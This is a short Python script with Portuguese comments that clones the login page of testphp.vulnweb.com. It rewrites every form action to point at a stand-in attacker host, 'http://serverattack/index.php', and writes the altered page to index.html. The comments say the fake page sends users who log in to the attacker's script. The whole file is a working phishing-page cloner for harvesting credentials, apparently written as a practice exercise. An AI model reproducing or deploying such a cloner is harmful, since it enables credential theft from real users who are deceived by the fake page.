from bs4 import BeautifulSoup
import requests
URL = "http://testphp.vulnweb.com/login.php"
resposta = requests.get(URL)
#LXML é um recurso para processar documentos HTML e XML
bs = BeautifulSoup(resposta.text, "lxml")
#busca pela palavra form, ou seja, formularios que da para ser clonados
forms = bs.find_all("form")
#Inicia um laço for para percorrer cada formulario da lista de formularios
for form in forms:
    #altera o conteudo do action para o endereço alvo desejado, assim quando
    #o usuario acessar a pagina falsa ele vai ser redirecionado para o index.php que tem um script
    form["action"] = "http://serverattack/index.php"
#Abre o arquivo index.html e escreve o conteudo alterado da pagina no index
with open("index.html", "w") as pagina:
    pagina.write(str(bs))
print("Pagina clonada com sucesso")
